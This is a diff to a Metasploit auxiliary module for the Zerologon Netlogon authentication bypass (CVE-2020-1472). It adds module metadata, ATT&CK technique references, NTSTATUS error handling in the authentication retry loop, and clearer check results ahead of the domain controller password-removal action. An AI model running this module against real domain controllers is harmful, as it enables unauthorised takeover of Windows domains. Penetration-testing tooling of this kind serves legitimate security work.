@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'windows_error'
+
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::DCERPC
@@ -33,7 +35,10 @@ class MetasploitModule < Msf::Auxiliary
           'Dirk-jan Mollema' # password restoration technique
         ],
         'Notes' => {
-          'AKA' => [ 'Zerologon' ]
+          'AKA' => ['Zerologon'],
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
         },
         'License' => MSF_LICENSE,
         'Actions' => [
@@ -45,7 +50,9 @@ class MetasploitModule < Msf::Auxiliary
           [ 'CVE', '2020-1472' ],
           [ 'URL', 'https://www.secura.com/blog/zero-logon' ],
           [ 'URL', 'https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py' ],
-          [ 'URL', 'https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py' ]
+          [ 'URL', 'https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py' ],
+          [ 'ATT&CK', Mitre::Attack::Technique::T1068_EXPLOITATION_FOR_PRIVILEGE_ESCALATION ],
+          [ 'ATT&CK', Mitre::Attack::Technique::T1078_VALID_ACCOUNTS ]
         ]
       )
     )
@@ -86,11 +93,17 @@ class MetasploitModule < Msf::Auxiliary
       response = netr_server_authenticate3
 
       break if (status = response.error_status) == 0
+
+      windows_error = ::WindowsError::NTStatus.find_by_retval(response.error_status.to_i).first
+      # Try again if the Failure is STATUS_ACCESS_DENIED, otherwise something has gone wrong
+      next if windows_error == ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
+
+      fail_with(Failure::UnexpectedReply, windows_error)
     end
 
-    return CheckCode::Detected unless status == 0
+    return Exploit::CheckCode::Detected('Target responded but Zerologon exploit did not succeed') unless status == 0
 
-    CheckCode::Vulnerable
+    Exploit::CheckCode::Vulnerable('Zerologon authentication bypass succeeded')
   end
 
   def run
@@ -103,7 +116,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_remove_password
-    fail_with(Failure::Unknown, 'Failed to authenticate to the server by leveraging the vulnerability') unless check == CheckCode::Vulnerable
+    fail_with(Failure::Unknown, 'Failed to authenticate to the server by leveraging the vulnerability') unless check == Exploit::CheckCode::Vulnerable
 
     print_good('Successfully authenticated')
 
